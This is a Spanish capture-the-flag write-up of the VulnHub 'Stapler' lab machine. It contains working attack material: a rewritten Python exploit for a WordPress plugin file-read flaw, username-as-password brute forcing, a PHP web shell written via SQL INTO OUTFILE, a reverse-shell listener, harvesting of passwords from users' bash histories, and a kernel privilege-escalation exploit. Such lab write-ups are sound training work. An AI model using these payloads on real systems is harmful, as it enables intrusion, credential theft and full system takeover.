# Stapler (VulnHub - ???) WriteUp Español
[🦔](#PreRequerimientos) #PreRequerimientos

[🦔](#Reconocimiento) #Reconocimiento
- Escaneo usual (IP, MAC, TTL, Puertos, Versiones y Servicios, Launchpad).

[🦔](#VulnGathering) #VulnGathering
- Acceso FTP anónimo.
- Enumeración con `guest` de SMB + descubrimiento de usuarios.

[🦔](#Engaño) #Engaño
- Ataque por fuerza bruta a SSH y SMB con `nxc`.
- Reconocimiento de SMB por `guest`.
- Escaneo de vulnerabilidades http con `nuclei`.
- Enumeración de directorios.
- Pruebas a WordPress con `wpscan` + descubrimiento de usuarios.
- Descubrimiento de plugin vulnerable + modificación de exploit.
- Descubrimiento de credenciales MySQL + descubrimiento de usuarios.
- Inyección de comandos por SQL + obtención de reverse shell.

[🦔](#Explotación) #Explotación
- Compromiso de sistema por SSH y Reverse Shell.

[🦔](#GanarControl) #GanarControl
- Reconocimiento de sistema y vulnerabilidades (credenciales filtradas y kernel vulnerable).
- Lectura de archivos automatizada por bash.
- Análisis y ejecución de CVE-2017-16995 (exploit del kernel).

[🦔](#Resultados-PoC) #Resultados-PoC
- Obtención de root
- Resumen de hallazgos/vulnerabilidades

_Presiona al erizo para dirigirte al contenido._

## PreRequerimientos
Este documento son resultados y hallazgos obtenidos en una emulación de escenario de *prueba de penetración* en una modalidad de caja Gris.

La intención de la metodología usada es para presentar el reporte por *escenarios de riesgo*, mientras se obtiene el objetivo de la máquina objetivo. véase [[Metodología]]
#### Sobre la máquina
```http
Nombre: Stapler
Autor: g0tmi1k
Objetivo: get Root
Dificultad: beginer/intermediate
Plataforma: VulnHub
```

Desde una conexión de red interna, el escenario de pruebas se compone de:
> IP Atacante: 192.168.0.21

> IP Víctima:   192.168.0.72

#### Consideraciones adicionales
Esta máquina se ejecutó directamente en VirtualBox.

<small>Durante el reporte se utiliza '[...]' para omitir partes que no serán de interés en el proceso de penetración.</small>

## Reconocimiento
Se identificó la dirección IP de la máquina objetivo mediante `ARP-scan`:
```python
$sudo arp-scan -I wlp2s0 --localnet
[...]
192.168.0.72	08:00:27:11:66:0e	(Unknown)
```

Sobre la [información de la dirección MAC](https://uic.io/es/mac/vendor/search/), se obtuvo lo siguiente:
```python
Vendor name: PCS Systemtechnik GmbH
MAC Prefix: 08:00:27
```
Prefijo anterior de VirtualBox, por lo cual el equipo fue identificado como una máquina virtual de VirtualBox.

Se verificó la conectividad con un `ping`:
```python
$ping -c 1 192.168.0.72
PING 192.168.0.72 (192.168.0.72) 56(84) bytes of data.

--- 192.168.0.72 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```
No recibimos respuesta, tal vez existe algún mecanismo que no concluya la IP. Los siguientes comandos se realizaron sin descubrimiento de host

Posteriormente se realizó un escaneo de puertos completo con Nmap:
```python
$nmap -p- -Pn -n --min-rate 5000 192.168.0.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-19 14:43 CST
Nmap scan report for 192.168.0.72
Host is up (0.014s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
```

Un escaneo más detallado se ejecutó, para identificar versiones y servicios:
```python
$sudo nmap -p21,22,53,80,139,666,3306,12380 -sSCV -Pn -n 192.168.0.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-19 14:46 CST
Nmap scan report for 192.168.0.72
Host is up (0.013s latency).

PORT      STATE  SERVICE     VERSION
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: [...]
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   [...]
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     [...]
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: SupportsLoadDataLocal, Support41Auth, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, SupportsCompression, FoundRows, IgnoreSigpipes, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, ODBCClient, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: #nw\x1BxI*\x11p^m:^\x1DB\x06\x0E\x17Ji
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Los hallados se encontraron vulnerables, el resumen de este hallazgo estará en [[#Hallazgos de postura de seguridad]].
## VulnGathering
Se comenzó con el acceso anónimo disponible en el puerto 21 y se encontró esta información:
```python
$ftp 192.168.0.72 -a
Connected to 192.168.0.72.
220-|--------------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|--------------------------------------------------------------------------------------------|
331 Please specify the password.
230 Login successful.
[...]
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
[...]
100% |**************************************|   107        3.29 MiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (12.16 KiB/s)
ftp> bye
221 Goodbye.
$cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```
Gracias al mensaje `200 PORT command successful. Consider using PASV.` se infirió que el protocolo en el puerto 21 está en modo activo.
Se obtuvieron posibles usuarios: `elly, john, harry`. Y se intentó hacer un ataque de fuerza bruta a FTP.

Mientras eso sucedía se hizo una enumeración de SMB:
Por otro lado, se indagó en la enumeración de Samba:
```python
$enum4linux 192.168.0.72
 ==================( Share Enumeration on 192.168.0.72 )==================
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service$enum4linux 192.168.0.72$enum4linux 192.168.0.72 (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            RED
[...]
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```
## Engaño
A partir de aquí se comenzó con diferentes vectores de ataque que involucran a dos escenarios de riesgo: Fuerza bruta a los servicios y un reconocimiento SMB que encaminó a un reconocimiento web.

### Fuerza bruta a servicios
Dentro de las pruebas, se reconoció el uso de nombre de uusario como contraseña, en FTP y SSH. (En ftp, no se encontró información imprescindible para la explotación).
```python
$nxc ftp 192.168.0.72 -u users.txt -p users.txt --ignore-pw-decoding
FTP         192.168.0.72    21     192.168.0.72     [+] SHayslett:SHayslett

$nxc ssh 192.168.0.72 -u users.txt -p users.txt --ignore-pw-decoding
SSH         192.168.0.72    22     192.168.0.72     [+] SHayslett:SHayslett  Linux - Shell access!
```
### Reconocimiento de servicios
Se comenzó con el reconocimiento a recursos compartidos en puerto 139. Véase [[Samba Pentest]]
```python
$smbmap -H 192.168.0.72 -P 139 -u 'guest' -p ''
[+] Guest session   	IP: 192.168.0.72:139	Name: 192.168.0.72                                      
    Disk                    Permissions	Comment
	----                    -----------	-------
	print$                  NO ACCESS	Printer Drivers
	kathy                   READ ONLY	Fred, What are we doing here?
	tmp                    	READ, WRITE	All temporary files should be stored here
	IPC$                    NO ACCESS	IPC Service (red server (Samba, Ubuntu))
```
Se revisa el directorio `/kathy`
```python
$smbmap -H 192.168.0.72 -P 139 -u 'guest' -p '' -r kathy
[+] Guest session   	IP: 192.168.0.72:139	Name: 192.168.0.72                                      
    Disk                    Permissions	Comment
	----                    -----------	-------
	kathy                   READ ONLY	
	.\kathy\*
	dr--r--r--                0 Fri Jun  3 11:52:52 2016	.
	dr--r--r--                0 Mon Jun  6 16:39:56 2016	..
	dr--r--r--                0 Sun Jun  5 10:02:27 2016	kathy_stuff
	dr--r--r--                0 Sun Jun  5 10:04:14 2016	backup

```

Se leyó el directorio visulaizado:
```python
$smbclient -U 'guest' //192.168.0.72/kathy
[...]
smb: \> ls
  .                                   D        0  Fri Jun  3 11:52:52 2016
  ..                                  D        0  Mon Jun  6 16:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 10:02:27 2016
  backup                              D        0  Sun Jun  5 10:04:14 2016
[...]
smb: \> cd kathy_stuff\
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 10:02:27 2016
  ..                                  D        0  Fri Jun  3 11:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 10:02:27 2016
[...]
smb: \> cd backup\
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 10:04:14 2016
  ..                                  D        0  Fri Jun  3 11:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 10:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 12:14:46 2015
```
Se analizaron los archivos:
```python
$cat todo-list.txt 
I'm making sure to backup anything important for Initech, Kathy
```
En `vsftpd.conf` encontramos por ejemplo la línea `pasv_enable=no`, el modo pasivo comentado anteriormente.

También tratamos el archivo de WordPress: 
```python
$gunzip wordpress-4.tar.gz 
$tar -xvf wordpress-4.tar
```
Veáse [[Archivos comprimidos]]

Se indagó en el otro puerto http, sin noticias de WordPress:
```python
$whatweb http://192.168.0.72:12380
http://192.168.0.72:12380 [400 Bad Request] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.0.72], Title[Tim, we need to-do better next year for Initech], UncommonHeaders[dave], X-UA-Compatible[IE=edge]
```

En el código fuente se encontró este comentario, que refuerza a uno de los usuarios encontrados:
```html
<title>Tim, we need to-do better next year for Initech</title>
[...]
<!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->
```

Con nuclei, se encontró algo relacionado con certificados.
```python
$nuclei -u http://192.168.0.72:12380/
[...]
[weak-cipher-suites:tls-1.0] [ssl] [low] 192.168.0.72:12380 [[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]]
[weak-cipher-suites:tls-1.1] [ssl] [low] 192.168.0.72:12380 [[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]]
[tls-version] [ssl] [info] 192.168.0.72:12380 [tls10]
[tls-version] [ssl] [info] 192.168.0.72:12380 [tls11]
[tls-version] [ssl] [info] 192.168.0.72:12380 [tls12]
```
Se obtuvo información con `https://192.168.0.72:12380/`: `Internal Index Page!`

Se hizo un escaneo de directorios donde se encontró información interesante como un panel de administración y un robots.txt:
```python
$dirb https://192.168.0.72:12380/
[...]                                                          
---- Scanning URL: https://192.168.0.72:12380/ ----
==> DIRECTORY: https://192.168.0.72:12380/announcements/                         
+ https://192.168.0.72:12380/index.html (CODE:200|SIZE:21)                       ==> DIRECTORY: https://192.168.0.72:12380/javascript/                            ==> DIRECTORY: https://192.168.0.72:12380/phpmyadmin/                            + https://192.168.0.72:12380/robots.txt (CODE:200|SIZE:59)
[...]

$curl -k https://192.168.0.72:12380/robots.txt
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```
Revisando los sitios no indexados, el primero no parece dar información y el segundo parece ser el sitio WordPress que buscamos.
```python
$curl -k https://192.168.0.72:12380/admin112233/
<html>
<head>
<title>mwwhahahah</title>
<body>
<noscript>Give yourself a cookie! Javascript didn't run =)</noscript>
<script type="text/javascript">window.alert("This could of been a BeEF-XSS hook ;)");window.location="http://www.xss-payloads.com/";</script>
</body>
</html>
$curl -k https://192.168.0.72:12380/blogblog/
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://192.168.0.72:12380/blogblog/xmlrpc.php">
[...]

$whatweb https://192.168.0.72:12380/blogblog/
https://192.168.0.72:12380/blogblog/ [200 OK] Apache[2.4.18], Bootstrap[20120205,4.2.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.0.72], JQuery, MetaGenerator[WordPress 4.2.1], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Initech | Office Life], UncommonHeaders[dave], WordPress[4.2.1], x-pingback[https://192.168.0.72:12380/blogblog/xmlrpc.php]
```

En el reconocimiento se encontró un directorio `/wp-admin/` que nos lleva a poder registrarnos en `https://192.168.0.72:12380/blogblog/wp-login.php?action=register`. Procedimos a registrarnos, pero se requiere un correo para culminar la autenticación (se pausó el vector de ataque).

Por otro lado en el directorio `/wp-content/`se logró ver `themes`, `plugins` y `uploads`.

Mientras se exploraban los directorios, se hizo una prueba del sitio con `wpscan` y se logró enumerar usuarios.
```python
$wpscan --url https://192.168.0.72:12380/blogblog/ --disable-tls-checks -e u
[...]
[i] User(s) Identified:

[+] John Smith
 | Found By:[..]
[+] john
 | Found By:[..]
[+] elly
 | Found By:[..]
[+] peter
 | Found By:[..]
[+] barry
 | Found By:[..]
[+] heather
 | Found By:[..]
[+] garry
 | Found By:[..]
[+] harry
 | Found By:[..]
[+] scott
 | Found By:[..]
[+] kathy
 | Found By:[..]
[+] tim
 | Found By:[..]
```

Continuando el reconocimiento, en `/plugins` se visualizó un plugin vulnerable: `https://192.168.0.72:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/`

```python
$searchsploit advanced video
----------------------------------------------------------- ---------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py
```

El objetivo de este exploit es leer archivos en el servidor y mostrarlos públicamente en `wp-config.php`. Causando lo siguiente:
- Usar una función mal implementada para:
	- Leer archivos arbitrarios sin autenticación: `wp-config.php`
	- Hacer que WordPress los guarde y los exponga como si fueran imágenes.
	- Obtener información sensible como credenciales de base de datos.

>El archivo afectado es `/inc/classes/class.avePost.php`
>La función vulnerable es `ave_publishPost()`

La parte de `/wp-admin/admin-ajax.php?action=ave_publishPost&title=RANDOM_NUMBER&short=rnd&term=rnd&thumb=../wp-config.php` es una solicitud que llama a la función vulnerable, apelando a la parte del código que indica el exploit:
```php
  function ave_publishPost(){
    $title = $_REQUEST['title'];
    $term = $_REQUEST['term'];
    $thumb = $_REQUEST['thumb'];
 <snip>
 Line 78:
    $image_data = file_get_contents($thumb);
```
Es decir, el parámetro `thumb` se usa directamente en `file_get_contents()` sin validación. Provocando así el acceso a archivos arbitrarios, en este caso `wp-config.php` como si fuera una imagen, sin validar que es una imagen.

Posteriormente WordPress guardará el contenido del archivo en `/wp-content/uploads/`. Siendo información crítica en texto plano que tiene credenciales.

Se reescribió el exploit, siendo en resumen, un script que genera un `title` aleatorio y hace la petición a `admin-ajax.php?action=ave_publishPost con thumb=../wp-config.php`. Haciendo que WordPress genere un nuevo post y lo sube a `wp-content/uploads/`.
```python
import random
import urllib.request
import re
import ssl

# Se desactivó la verificación SSL si es necesario
ssl._create_default_https_context = ssl._create_unverified_context

# Se cambió la URL a la de la máquina
base_url = "https://192.168.0.72:12380/blogblog"

# Se generó un ID aleatorio
randomID = random.randint(10000, 999999)

# Se construyó la URL para crear el post
exploit_url = f"{base_url}/wp-admin/admin-ajax.php?action=ave_publishPost&title={randomID}&short=rnd&term=rnd&thumb=../wp-config.php"

print(f"[+] Enviando payload a: {exploit_url}")

# Se realiza la solicitud
with urllib.request.urlopen(exploit_url) as response:
    created_url = response.read().decode().strip()
    print(f"[+] Post creado en: {created_url}")

# Se extrae el ID del post
match = re.search(r'\?p=(\d+)', created_url)
if match:
    post_id = match.group(1)
    final_url = f"{base_url}/?p={post_id}"

    print(f"[+] Leyendo contenido desde: {final_url}")
    with urllib.request.urlopen(final_url) as response:
        content = response.read().decode()
        print("[+] Contenido del wp-config.php (parcial):")
        print("="*60)
        for line in content.splitlines():
            if 'DB_' in line or 'define' in line:
                print(line)
else:
    print("[-] No se pudo extraer el ID del post.")
```
Se ejecutó y se validó el script adaptado, tomando en cuenta el certificado.
```python
$python3 39646.py 
[+] Enviando payload a: https://192.168.0.72:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=318330&short=rnd&term=rnd&thumb=../wp-config.php
[+] Post creado en: https://192.168.0.72:12380/blogblog/?p=310
[+] Leyendo contenido desde: https://192.168.0.72:12380/blogblog/?p=310
[...]

$wget --no-check-certificate https://192.168.0.72:12380/blogblog/wp-content/uploads/1083801387.jpeg
[...]
El propietario del certificado no se ajusta al nombre de equipo 192.168.0.72
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3042 (3.0K) [image/jpeg]
Grabando a: 1083801387.jpeg

1083801387.jpeg      100%[=====================>]   2.97K  --.-KB/s    en 0s      

2025-05-20 14:55:22 (144 MB/s) - 1083801387.jpeg guardado [3042/3042]

$file 1083801387.jpeg 
1083801387.jpeg: PHP script, ASCII text
```
Dentro de la información obtenida, se encontró el siguiente pedazo de texto:
```python
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```
Se accedió al servicio mysql como root a la base de datos `wordpress`, de hecho se puede visualizar:
```sql
$mysql -u root -h 192.168.0.72 -p wordpress
Enter password: 
[...]

MySQL [wordpress]> select * from wordpress
    -> ;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.008 sec)
```
Se obtuvo información de usuarios registrados y sus contraseñas.
```sql
MySQL [wordpress]> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
| alexi      | $P$Bd/l6jEcyOlk91ddFn2p.Om79kaHKj0 |
+------------+------------------------------------+
17 rows in set (0.009 sec)
```
## Explotación
Por el lado de la fuerza bruta a servicios, se accedió a SSH con credenciales de usuario `SHayslett`, obtenidas en [[Stapler#Fuerza bruta a servicios]]
### Webshell desde reconocimiento web
Se realizó una inyección SQL en un archivo acchesicle para ejecutar comandos:
```sql
MySQL [wordpress]> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';
Query OK, 1 row affected (0.013 sec)
```
Se obtuvo la reverse shell:
```python
$rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.0.21] from (UNKNOWN) [192.168.0.72] 43384
script /dev/null -c bash
Script started, file is /dev/null
www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
```

## GanarControl
En el reconocimiento se encontraron estas vulnerabilidades:
Kernel de linux vulnerable para escalación:
```js
SHayslett@red:~$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
```
Por otro lado, se encontró acceso a las carpetas personales de los usuarios y en ellas, el documento `.bash_history`, por lo tanto se ejecutó un comando para visualizar todos los archivos de histórico.
```python
$ find . -name ".bash_history" 2>/dev/null -exec cat {} + | less

id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
:
```
Explicación del comando:
- `find .`: Se buscan archivos en el directorio actual.
- `-name ".bash_history"`: Se define el patrón del nombre definido para búsqueda.
- `2>/dev/null`: Se ocultan los errores si existen directorios sin permisos.
- `-exec cat {} +`: Para cada archivo encontrado '`{}`', se ejecuta `cat` para mostrar el contenido. Se agrupan varios archivos en una sola ejecución con `+`.

Este código y más variaciones en [[Bash Trucazos]].

A partir de aquí, se volvió a bifurcar el camino para llegar a la escalación de privilegios por diferentes escenarios de riesgo:
### Credenciales filtradas
```js
SHayslett@red:/home$ su peter
Password: 
red% script /dev/null -c bash
Script started, file is /dev/null
peter@red:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL

```

### Escalación por kernel vulnerable
Dado el reconocimiento del SO, obteniendo compromiso al sistema, se explotó el CVE-2017-16995 (DoublePut).
#### Explicación del Exploit
El exploit utilizado llamado `dobleput`, está basado en la  vulnerabilidad reportada en el `Project Zero`de Google.
Te vengo presentando una explicación de aquellas de aquel:

A partir del kernel de linux 4.4, si el sistema tiene habilitado el soporte para BFP (CONFIG_BGP_SYSCALL) y no ha sido deshabilitado para usuarios sin privilegios (`kernel.unprivileged_bpf_disabled != 1`), podrían usar el syscall `bpf()` para cargar programas eBPF. Esto es por defecto en Ubuntu 16.04, por lo que lo hace vulnerable.

El exploit abusa del manejo incorrecto de referencias a archivos (`struct file`) cuando se usa `bpf(BPF_PROG_LOAD, ...)`, este syscall, intenta reemplazar descriptores de mapa (`map df`) por punteros reales a mapas de eBPF usando la función `replace_map_fd_with_map_ptr()`.
Dentro de esta función, se utiliza `__bpf_map_get()` para convertir el descriptor en un puntero al mapa. 

El problema está en que si el descriptor de archivo no corresponde a un mapa eBPF válido, se realiza una doble llamada a fdput(), reduciendo el contador más de lo necesario, *over-decrement* que le dicen. 
Esto provoca a su vez una liberación prematura del `struct file` mientras aún hay referencias activas. Típico movimiento *use-after-free* (UAF).

Pero lo la mera manteca es lo que se aproxima: Una vez que se libera `struct file` el espacio de memoria puede reutilizarse para otro archivo. Si el atacante controla el momento de *reutilización*, provoca que una operación de escritura pensada para un archivo A, se escriba sobre un archivo B, incluso si B es de sólo lectura como `/etc/crontab`.

Se ocupó tiempo en entenderlo, así que para que valga la pena, lo explicamos de la manera más fácil posible, así como para un niño. Feynman estaría orgulloso:

_Mire pequeño, imaginemos que tenemos una caja para guardar items del maincra, está en un almacén administrado por duendes que llevan la cuenta de que cajas se usan y cuales no, esa caja tiene una etiqueta con tu nombre (de esa manera sabes que es tuya)._

_Un día llegas de maldoso y dices "señor duende, tome esta etiqueta y dígame cuantos diamantes tengo" pero lo que el duende no sabe es que le diste otra etiqueta... pillín!!_

_Esta etiqueta la manda con otra caja haciendo que el duende se buguié, por el error dice, "tengo que tirar esta caja porque tiene error", pero también dice "esta caja se la tengo que dar al morro que para nada se ve maldoso". Y así es como termina soltando dos veces la caja (doble put) y si puedes usar la caja después de tirarla (use-after-free)_

_Entonces pones en juego tu intención, haces que en el lugar del alamacén donde estaba la caja, pongan otra, eres listo y sabes que está vacía. Pero te dormiste al duende, él no se ha enterado del cambio y si le pides guardar más items, lo hará, usará la etiqueta vieja y modificará la nueva sin permiso. ¡Ahora ya puedes guardar cosas en donde no tenias permisos! ¿Te gustó?_

Se procederá haciendo un archivo escribible y comenzando una operación de escritura. Antes de que se complete lo anterior, se provoca en el `struct file` sea liberado. Y rápidamente se hace la acción, esperando reutilizar la misma dirección de memoria.

El tiempo se controla con FUSE (sistema de archivos que puede retrasar la lectura de datos). `writev()` y `nmap()` fuerzan un `page fault` para "congelar" al kernel.

#### Ejecución del Exploit
Dentro de la máquina, se visualiza la herramienta de compilación:
```python
SHayslett@red:~$ which gcc
/usr/bin/gcc
SHayslett@red:~$ which make
/usr/bin/make
```
Procedemos a descargar el exploit:
```python
SHayslett@red:~$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O doubleput.zip
[...]
Saving to: 'doubleput.zip'

doubleput.zip        100%[=====================>]   6.86K  --.-KB/s    in 0s      

2025-05-20 13:25:47 (92.0 MB/s) - 'doubleput.zip' saved [7025/7025]

SHayslett@red:~$ unzip doubleput.zip
Archive:  doubleput.zip
   creating: [...] 
SHayslett@red:~$ ls
39772  __MACOSX  doubleput.zip
```
Se hizo el tratamiento del archivo descargado hasta encontrar el ejecutable
```python
SHayslett@red:~/39772$ tar -xvf exploit.tar 
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c

SHayslett@red:~/39772$ ls
crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar
SHayslett@red:~/39772$ cd ebpf_mapfd_doubleput_exploit/
```
Se ejecutó el compilador hasta encontrar el `dobleput`
```python
SHayslett@red:~/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh 
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: 
	    [...]
SHayslett@red:~/39772/ebpf_mapfd_doubleput_exploit$ ls
compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper  suidhelper.c
```

## Resultados-PoC
### Root por permisos inseguros
Se obtuvo root por escalamiento lateral (usuario peter con permisos de root)
```python
peter@red:/home$ sudo su
➜  /home whoami
root
➜  /home 
[...]
➜  ~ ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  ~ cat flag.txt 
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

### Root por vulnerabilidad de kernel
Se obtuvo root por vulnerabilidad de kernel con los ejecutables que se prepararon:
```js
SHayslett@red:~/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
```
